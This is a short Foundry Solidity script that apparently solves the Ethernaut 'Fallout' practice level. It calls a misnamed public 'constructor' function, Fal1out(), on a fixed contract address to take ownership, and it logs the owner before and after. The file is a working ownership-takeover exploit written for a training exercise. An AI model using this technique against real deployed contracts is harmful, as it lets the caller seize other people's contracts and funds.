//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "../src/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";
/*
SOLUTION OBJECTIVE:
- To take ownership of the smart contract Fallout

SOLUTION APPROACH:
- It appears that the constructor's name does not match the contracts name , hence making it a regular function.
- We can call the constructor function to take ownership of the contract.
*/

contract Fallout_solution is Script {
    Fallout public falloutInstance =
        Fallout(0x82bCf7cD86B96406ccb1091E0dA8A9Aa9D86291B);

    function run() public {
        string memory mnemonic = vm.envString("MY_PRIVATE_KEY");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 0);
        vm.startBroadcast(deployerPrivateKey);
        console.log("Owner before exploit:", falloutInstance.owner);
        falloutInstance.Fal1out();
        console.log("Owner after exploit:", falloutInstance.owner);
        vm.stopBroadcast();
    }
}
